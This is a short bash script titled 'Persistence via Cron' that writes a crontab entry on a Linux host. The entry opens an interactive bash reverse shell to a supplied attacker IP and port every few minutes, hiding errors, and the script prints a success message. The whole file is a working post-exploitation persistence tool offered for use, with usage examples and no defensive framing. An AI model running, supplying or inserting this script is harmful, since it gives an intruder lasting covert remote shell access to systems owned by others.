#!/bin/bash
# ==========================================
# Persistence via Cron
# ==========================================
# Usage: ./persistence_cron.sh <ATTACKER_IP> <PORT> [INTERVAL]
# Example: ./persistence_cron.sh 192.168.1.100 4444 15
# ==========================================

set -e

ATTACKER_IP="$1"
PORT="$2"
INTERVAL="${3:-15}"  # Default: every 15 minutes

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# Check arguments
if [ -z "$ATTACKER_IP" ] || [ -z "$PORT" ]; then
    echo -e "${RED}Usage: $0 <ATTACKER_IP> <PORT> [INTERVAL_MINUTES]${NC}"
    echo -e "${YELLOW}Example: $0 192.168.1.100 4444 15${NC}"
    exit 1
fi

# Cron command
CRON_CMD="*/$INTERVAL * * * * /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1' 2>/dev/null"

echo -e "${YELLOW}[*] Adding persistence to crontab...${NC}"
echo -e "${YELLOW}[*] Interval: every $INTERVAL minutes${NC}"

# Add to crontab
(crontab -l 2>/dev/null | grep -v "$ATTACKER_IP"; echo "$CRON_CMD") | crontab -

echo -e "${GREEN}[+] Persistence added successfully!${NC}"
echo -e "${GREEN}[+] Current crontab:${NC}"
crontab -l
